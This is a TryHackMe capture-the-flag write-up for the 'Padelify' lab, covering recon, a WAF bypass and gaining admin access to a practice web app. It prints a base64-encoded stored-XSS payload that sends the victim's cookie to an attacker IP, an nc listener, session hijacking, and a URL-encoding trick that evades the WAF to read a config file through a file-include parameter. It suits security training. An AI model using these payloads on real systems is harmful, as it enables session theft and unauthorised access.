# Padelify — Write-up

**Platform:** TryHackMe  
**Room:** Padelify  
**Difficulty:** Medium  
**Estimated Time:** ~60 minutes  
**Goal:** Bypass the WAF and obtain admin access in the web application.

---

## Scope and target

**Target:** `http://padelify.thm` (resolved via `/etc/hosts` → `10.64.175.3`)  
**Exposed services:** SSH (22/tcp) and HTTP (80/tcp)

---

## Recon and enumeration

### Nmap (Top 1000 + versions)

```bash
nmap -n -Pn -sCV --min-rate 500 10.64.175.3
```

**Result:**
```text
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Padelify - Tournament Registration
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key point:** `PHPSESSID` **without HttpOnly** (relevant if XSS is possible).

---

### Fingerprint (WhatWeb)

```bash
whatweb http://10.64.175.3
```

```text
http://10.64.175.3 [403 Forbidden] Apache[2.4.58], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], Title[⚠️ 403 Forbidden]
```

---

### /etc/hosts

```bash
echo "10.64.175.3 padelify.thm" >> /etc/hosts
```

---

### WAF behavior observed

**Direct curl to `/` → 403 with “WAF ACTIVE” page:**
```bash
curl http://padelify.thm
```

**Via Burp (browser-like request) → 200 OK + `PHPSESSID`:**

```http
GET / HTTP/1.1
Host: padelify.thm
Accept-Language: pt-BR,pt;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

```http
HTTP/1.1 200 OK
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=utc579se71lflglmj6d9s859rj; path=/
Content-Type: text/html; charset=UTF-8
```

**Practical conclusion:** the WAF does not block “by fixed endpoint”; it appears to react to the **request profile** (headers/UA/flow), since the same path flips from 403 → 200 depending on how the request is made.

---

### Attack surface (routes and fields)

#### Routes identified in HTML and enumeration
- `register.php` (signup form target)
- `login.php` (exposed link)
- assets: `/css/bootstrap.min.css`, `/js/bootstrap.bundle.min.js`

#### Form fields (signup)
- `username` (text)
- `password` (password)
- `level` (`amateur`, `professional`, `expert`)
- `game_type` (`single`, `double`)

#### Business logic clue (strong signal)
The messages **“Sign up and a moderator will approve…”** and **“Wait for moderator approval”** suggest signup data will be reviewed in an admin panel. This is a classic scenario for **Stored XSS** (inject during signup → execute when moderator/admin views the record).

---

### Fuzzing/Discovery (ffuf)

**Directories:**
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -H 'User-Agent: "Mozilla/5.0"' \
  -u http://padelify.thm/FUZZ
```

**Main findings:**
- `css/`, `js/`, `javascript/`
- `config/`
- `logs/`
- `server-status` (403)

**Files + extensions:**
```bash
ffuf -w /usr/share/wordlists/dirb/common.txt \
  -H 'User-Agent: "Mozilla/5.0"' \
  -u http://padelify.thm/FUZZ \
  -e .php,.html,.txt,.conf,.ini -ic -fs 2872
```

**Main routes/files:**
- `change_password.php` (302)
- `dashboard.php` (302)
- `live.php` (200)
- `login.php` (200)
- `match.php` (200)
- `register.php` (302)
- `status.php` (200)
- `header.php` (200), `footer.php` (200)

---

### Exposed directories and logs

#### `/config/`
Directory listing is exposed, but `app.conf` is blocked by the WAF:
```text
Index of /config
app.conf  ...  (Blocked by WAF)
```

#### `/logs/error.log` (exposed)
Relevant content (summary):
- **Version:** `Padelify v1.4.2`
- **Internal config path:** `/var/www/html/config/app.conf`
- **WAF alerts (ModSecurity):** detection of obfuscated XSS and double-encoding
- **Parse failure:** `Failed to parse admin_info in /var/www/html/config/app.conf: unexpected format`
- **Hint of internal live feed port:** `cannot bind to 0.0.0.0:9000 (address already in use)`

---

## Exploitation

### Hypothesis: Stored XSS via approval workflow

Technical motivation:
- There is an explicit “moderator approval” flow.
- `PHPSESSID` cookie does not have `HttpOnly`.
- Logs indicate the WAF monitors obfuscated XSS payloads (so XSS is an expected vector in the lab).

Objective:
- Inject a persistent payload in a field that will be rendered to moderator/admin.
- Exfiltrate `document.cookie` (or directly `PHPSESSID`).
- Reuse the `PHPSESSID` to take over a privileged session.

---

### PoC: injection + cookie exfiltration

Base64 payload (as used in the lab):
```bash
echo -n "fetch('http://<ip-attacker>/'+document.cookie)" | base64
ZmV0Y2goJ2h0dHA6Ly8xOTIuMTY4LjEyOS43My8nK2RvY3VtZW50LmNvb2tpZSk=
```

Example injection (field `level`):
```text
username=JoeyFrancisca&password=Daenerys&level=<iframe src="javascript:eval(atob('ZmV0Y2goJ2h0dHA6Ly8xOTIuMTY4LjEyOS43My8nK2RvY3VtZW50LmNvb2tpZSk='))"></iframe>&game_type=single
```

Listener to capture the callback:
```bash
nc -lvnp 80
```

Callback evidence:

```text
connect to [192.168.129.73] from (UNKNOWN) [10.66.130.52] 45150
GET /PHPSESSID=dc4drjt2tsh4dem294k6b9caan HTTP/1.1
Host: 192.168.129.73
User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36
Origin: http://localhost
```

**Interpretation:** an internal agent (moderator/admin) opened the record and executed the payload, sending the session cookie to the attacker host.

---

### Session hijack (PHPSESSID) and dashboard access

Steps performed:
1. Open `dashboard.php` in the browser.
2. Using DevTools/Inspect, replace the current `PHPSESSID` with the exfiltrated (admin) `PHPSESSID`.
3. Reload the page → privileged access and first flag obtained.

---

### Persistence: admin password change

After gaining access, the password was changed via `change_password.php` to reduce the risk of losing access.

---

## WAF bypass to read `app.conf` (via `live.php`)

Even while logged in as admin, direct access to `/config/app.conf` was still blocked by the WAF. The pivot was noticing `live.php` accepts a `page=` parameter and renders the requested content.

### Technical hypothesis
`live.php` appears to read/include files based on `page=` (pattern consistent with **LFI / file include**). The WAF blocked the cleartext path (`config/app.conf`), so the attempt was to **fully URL-encode** the path to evade the ModSecurity rule.

### Working request (byte-by-byte encoding)

```text
http://padelify.thm/live.php?page=%63%6f%6e%66%69%67%2f%61%70%70%2e%63%6f%6e%66
```

Where:
- `config/` → `%63%6f%6e%66%69%67%2f`
- `app.conf` → `%61%70%70%2e%63%6f%6e%66`

### Evidence: `app.conf` content displayed

```text
Live Match Center

version = "1.4.2"
enable_live_feed = true
enable_signup = true
env = "staging"
site_name = "Padelify Tournament Portal"
max_players_per_team = 4
maintenance_mode = false
log_level = "INFO"
log_retention_days = 30
db_path = "padelify.sqlite"
admin_info = "bL}8,S9W1o44"
misc_note = "do not expose to production"
support_email = "support@padelify.thm"
build_hash = "a1b2c3d4"
```

**Impact:** sensitive file disclosure via a public endpoint (even with WAF enabled), indicating inadequate input normalization/validation (encoding-based bypass).

---

## Second flag

After extracting the data from `app.conf`, I ended the hijacked session (cookie obtained via XSS) and authenticated again through the UI (`index.php`) as admin, now with valid credentials. The second flag was then available on the landing page after login.

---

*Written by Nelson Hirt*

